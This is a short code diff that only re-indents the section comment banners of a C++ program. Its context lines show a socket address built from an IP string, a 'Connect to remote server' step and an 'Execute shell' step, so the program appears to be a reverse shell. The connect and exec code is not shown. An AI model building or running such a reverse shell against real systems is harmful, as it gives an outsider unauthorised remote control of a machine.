@@ -1,5 +1,5 @@
-/*********************
-INITIALIZATION
+/********************
+    INITIALIZATION
 *********************/
 
 #include <iostream>
@@ -52,7 +52,7 @@ int main()
     shell_addr.sin_addr.s_addr = inet_addr(ip_addr);
 
     /*********************
-    CONNECTION
+        CONNECTION
     *********************/
 
     // Connect to remote server
@@ -70,7 +70,7 @@ int main()
 
 
     /*********************
-    SHELL EXECUTION
+        SHELL EXECUTION
     *********************/
 
     // Execute shell
